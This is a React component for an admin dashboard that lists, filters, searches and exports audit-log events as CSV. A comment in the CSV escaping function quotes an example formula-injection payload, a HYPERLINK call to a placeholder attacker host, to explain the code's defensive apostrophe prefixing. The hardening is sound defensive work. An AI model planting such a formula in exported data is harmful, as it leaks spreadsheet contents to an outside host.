import { useEffect, useState } from "react";
import {
  api,
  type AdminAuditLogCategory,
  type AdminAuditLogEntry,
  type AdminAuditEventType,
} from "../../api/client";

// Phase 20-P5: read-only tail of admin actions. The audit_log table
// records every successful write AND every rejected attempt — both
// surface here so admins notice their own near-misses (Phase 4.5
// client safety guard #8: "recent-actions panel always visible while
// editing" is the parent intent; this is the dedicated dashboard
// surface for it).

const EVENT_LABEL: Record<AdminAuditEventType, string> = {
  user_override_set: "Set user override",
  user_override_cleared: "Cleared user override",
  system_config_set: "Set project cap",
  system_config_cleared: "Cleared project cap",
  denylist_added: "Added to denylist",
  denylist_removed: "Removed from denylist",
  tab_opened: "Admin tab opened",
  rejected_attempt: "Rejected attempt",
  // Phase 25
  session_terminated: "Killed session",
  session_terminated_bulk: "Killed all sessions for user",
  user_frozen: "Froze user account",
  user_unfrozen: "Unfroze user account",
  budget_watcher_reset: "Reset budget watcher",
  platform_auth_unstick: "Unstick platform auth",
  // Phase 26
  user_force_signout: "Force sign-out",
  // Phase B8
  eval_sample_viewed: "Viewed eval sample",
  eval_sample_reviewed: "Reviewed eval sample",
  eval_sample_queue_resolved: "Resolved eval queue item",
};

const EVENT_TONE: Record<AdminAuditEventType, string> = {
  user_override_set: "bg-accent/15 text-accent",
  user_override_cleared: "bg-muted/15 text-muted",
  system_config_set: "bg-warn/15 text-warn",
  system_config_cleared: "bg-muted/15 text-muted",
  denylist_added: "bg-warn/15 text-warn",
  denylist_removed: "bg-muted/15 text-muted",
  tab_opened: "bg-muted/15 text-muted",
  rejected_attempt: "bg-danger/15 text-danger",
  // Phase 25
  session_terminated: "bg-warn/15 text-warn",
  session_terminated_bulk: "bg-danger/15 text-danger",
  user_frozen: "bg-danger/15 text-danger",
  user_unfrozen: "bg-muted/15 text-muted",
  budget_watcher_reset: "bg-warn/15 text-warn",
  platform_auth_unstick: "bg-warn/15 text-warn",
  // Phase 26
  user_force_signout: "bg-warn/15 text-warn",
  // Phase B8
  eval_sample_viewed: "bg-muted/15 text-muted",
  eval_sample_reviewed: "bg-accent/15 text-accent",
  eval_sample_queue_resolved: "bg-warn/15 text-warn",
};

const CHANGE_EVENT_TYPES: AdminAuditEventType[] = [
  "user_override_set",
  "user_override_cleared",
  "system_config_set",
  "system_config_cleared",
  "denylist_added",
  "denylist_removed",
  "rejected_attempt",
  "session_terminated",
  "session_terminated_bulk",
  "user_frozen",
  "user_unfrozen",
  "budget_watcher_reset",
  "platform_auth_unstick",
  "user_force_signout",
  "eval_sample_reviewed",
  "eval_sample_queue_resolved",
];

const REVIEW_EVENT_TYPES: AdminAuditEventType[] = [
  "tab_opened",
  "eval_sample_viewed",
];

function escapeCsvCell(v: unknown): string {
  if (v === null || v === undefined) return "";
  let s = typeof v === "string" ? v : JSON.stringify(v);
  // Phase 25 audit fix: CSV-injection hardening. Excel/Sheets/LibreOffice
  // treat cells starting with =, +, -, @, \t, \r as formulas. The `reason`
  // column is operator-typed (no charset restriction), so a malicious
  // admin could plant `=HYPERLINK("http://attacker?q="&A1,"Click")` and
  // exfiltrate data when another admin opens the export in Excel. A
  // leading apostrophe neutralizes the formula without altering the
  // visible cell content (Excel shows the value, doesn't evaluate).
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  // Wrap in quotes if it contains a comma, quote, or newline; double internal quotes.
  if (/[",\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

function entriesToCsv(entries: AdminAuditLogEntry[]): string {
  const header = [
    "createdAt",
    "eventType",
    "actorId",
    "targetUserId",
    "targetKey",
    "reason",
    "before",
    "after",
  ];
  const rows = entries.map((e) =>
    [
      e.createdAt,
      e.eventType,
      e.actorId,
      e.targetUserId ?? "",
      e.targetKey ?? "",
      e.reason ?? "",
      e.before,
      e.after,
    ]
      .map(escapeCsvCell)
      .join(","),
  );
  return [header.join(","), ...rows].join("\n");
}

function downloadCsv(name: string, csv: string): void {
  const blob = new Blob([csv], { type: "text/csv;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = name;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

export function AuditLogSection() {
  const [entries, setEntries] = useState<AdminAuditLogEntry[] | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [eventType, setEventType] = useState<string>("");
  const [category, setCategory] = useState<AdminAuditLogCategory>("changes");
  const [queryDraft, setQueryDraft] = useState("");
  const [query, setQuery] = useState("");

  const refresh = async (
    filter: string = eventType,
    nextCategory: AdminAuditLogCategory = category,
    nextQuery: string = query,
  ) => {
    try {
      const r = await api.adminGetAuditLog({
        limit: 50,
        eventType: filter || undefined,
        category: nextCategory,
        query: nextQuery || undefined,
      });
      setEntries(r.entries);
      setError(null);
    } catch (e) {
      setError((e as Error).message);
    }
  };

  useEffect(() => {
    void refresh(eventType, category, query);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [eventType, category, query]);

  if (error) {
    return (
      <div className="rounded-md border border-danger/40 bg-danger/10 p-3 text-[11px] text-danger">
        {error}
      </div>
    );
  }
  if (!entries) {
    return <div className="text-[11px] text-muted">Loading…</div>;
  }

  return (
    <div className="flex flex-col gap-3">
      <div>
        <h2 className="text-sm font-semibold text-ink">Operational history</h2>
        <p className="mt-0.5 max-w-3xl text-[11px] leading-relaxed text-muted">
          Changes and safety events are shown first by default. Routine tab and
          sample views live in Review activity, so they cannot bury a mutation
          during an incident.
        </p>
      </div>
      <div className="flex flex-wrap items-end justify-between gap-3 rounded-lg border border-border bg-elevated/20 p-3">
        <div className="flex flex-wrap items-end gap-3">
          <label className="flex flex-col gap-1 text-[10px] text-muted">
            Activity
            <select
              value={category}
              onChange={(e) => {
                setCategory(e.target.value as AdminAuditLogCategory);
                setEventType("");
              }}
              className="min-h-11 rounded-md border border-border bg-bg px-3 py-2 text-xs text-ink"
            >
              <option value="changes">Changes and safety</option>
              <option value="reviews">Review activity</option>
              <option value="all">All activity</option>
            </select>
          </label>
          <label className="flex flex-col gap-1 text-[10px] text-muted">
            Event type
            <select
              key={category}
              value={eventType}
              onChange={(e) => setEventType(e.target.value)}
              className="min-h-11 rounded-md border border-border bg-bg px-3 py-2 text-xs text-ink"
            >
              <option value="">All events</option>
              {(category === "changes"
                ? CHANGE_EVENT_TYPES
                : category === "reviews"
                  ? REVIEW_EVENT_TYPES
                  : [...CHANGE_EVENT_TYPES, ...REVIEW_EVENT_TYPES]
              ).map((t) => (
                <option key={t} value={t}>
                  {EVENT_LABEL[t]}
                </option>
              ))}
            </select>
          </label>
          <form
            className="flex items-end gap-2"
            onSubmit={(event) => {
              event.preventDefault();
              setQuery(queryDraft.trim());
            }}
          >
            <label className="flex flex-col gap-1 text-[10px] text-muted">
              Search actor, target, key, or reason
              <input
                type="search"
                value={queryDraft}
                onChange={(event) => setQueryDraft(event.target.value)}
                className="min-h-11 w-64 max-w-full rounded-md border border-border bg-bg px-3 py-2 text-xs text-ink"
                placeholder="e.g. anon_lesson_enabled"
              />
            </label>
            <button
              type="submit"
              className="min-h-11 rounded-md border border-border bg-elevated px-3 py-2 text-xs font-semibold text-ink"
            >
              Search
            </button>
            {(query || queryDraft) && (
              <button
                type="button"
                onClick={() => {
                  setQueryDraft("");
                  setQuery("");
                }}
                className="min-h-11 rounded-md px-3 py-2 text-xs text-muted hover:text-ink"
              >
                Clear
              </button>
            )}
          </form>
        </div>
        <div className="flex gap-2">
          <button
            onClick={() => {
              const stamp = new Date().toISOString().replace(/[:.]/g, "-");
              downloadCsv(`admin-audit-${stamp}.csv`, entriesToCsv(entries));
            }}
            className="min-h-11 rounded-md border border-border bg-elevated px-3 py-2 text-[10px] text-muted transition hover:text-ink"
          >
            Export CSV
          </button>
          <button
            onClick={() => void refresh()}
            className="min-h-11 rounded-md border border-border bg-elevated px-3 py-2 text-[10px] text-muted transition hover:text-ink"
          >
            Refresh
          </button>
        </div>
      </div>
      <p className="text-[10px] text-faint">
        Last {entries.length} matching events, newest first.
      </p>
      {entries.length === 0 && (
        <div className="rounded-md border border-border bg-elevated/30 p-3 text-[11px] text-muted">
          No admin actions match the current filter.
        </div>
      )}
      <div className="flex flex-col gap-1.5">
        {entries.map((e) => (
          <div
            key={e.id}
            className="rounded-md border border-border bg-elevated/30 p-2 text-[11px]"
          >
            <div className="flex items-baseline justify-between gap-2">
              <span
                className={`rounded px-1.5 py-0.5 text-[9px] font-semibold uppercase tracking-wider ring-1 ring-border/30 ${EVENT_TONE[e.eventType]}`}
              >
                {EVENT_LABEL[e.eventType]}
              </span>
              <span className="text-[10px] text-faint">
                {new Date(e.createdAt).toLocaleString()}
              </span>
            </div>
            <div className="mt-1 flex flex-wrap gap-x-3 gap-y-0.5 text-[10px] text-muted">
              <span>
                actor:{" "}
                <span className="font-mono text-ink">
                  {e.actorId.slice(0, 8)}…
                </span>
              </span>
              {e.targetUserId && (
                <span>
                  target user:{" "}
                  <span className="font-mono text-ink">
                    {e.targetUserId.slice(0, 8)}…
                  </span>
                </span>
              )}
              {e.targetKey && (
                <span>
                  key: <span className="font-mono text-ink">{e.targetKey}</span>
                </span>
              )}
            </div>
            {e.reason && (
              <div className="mt-0.5 italic text-[10px] text-faint">
                "{e.reason}"
              </div>
            )}
            {(e.before !== null || e.after !== null) && (
              <details className="mt-1 text-[10px]">
                <summary className="cursor-pointer text-muted hover:text-ink">
                  before/after
                </summary>
                <pre className="mt-1 overflow-x-auto rounded bg-bg p-1.5 font-mono text-[10px] text-ink">
                  {JSON.stringify({ before: e.before, after: e.after }, null, 2)}
                </pre>
              </details>
            )}
          </div>
        ))}
      </div>
    </div>
  );
}
